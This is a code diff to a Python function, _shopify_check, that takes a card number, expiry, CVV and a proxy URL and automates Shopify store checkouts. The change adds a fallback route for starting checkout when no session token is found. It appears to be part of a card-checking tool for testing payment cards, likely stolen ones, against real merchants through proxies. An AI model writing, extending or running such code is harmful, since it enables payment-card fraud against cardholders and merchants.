@@ -393,13 +393,22 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv, proxy_url=None):
     except:
         return None, "Failed to add to cart", gw_name, None
     
-    # Step 4: Start checkout from /cart (POST with checkout=)
+    # Step 4: Start checkout — try /cart POST first, then /checkout/ POST
     try:
         resp = await client.post(f"{base_url}/cart", data="updates%5B%5D=1&checkout=",
             headers={'Content-Type': 'application/x-www-form-urlencoded', 'Origin': base_url, 'Referer': f'{base_url}/cart'},
             follow_redirects=True, timeout=httpx.Timeout(15))
         checkout_url = str(resp.url)
         text = resp.text
+        # Check if we got a real checkout page
+        sst_check = _extract_session_token(text)
+        if not sst_check:
+            # Try /checkout/ instead
+            resp = await client.post(f"{base_url}/checkout/", 
+                headers={'Accept': 'text/html', 'User-Agent': UA},
+                follow_redirects=True, timeout=httpx.Timeout(15))
+            checkout_url = str(resp.url)
+            text = resp.text
     except:
         return None, "Failed to create checkout", gw_name, None
     
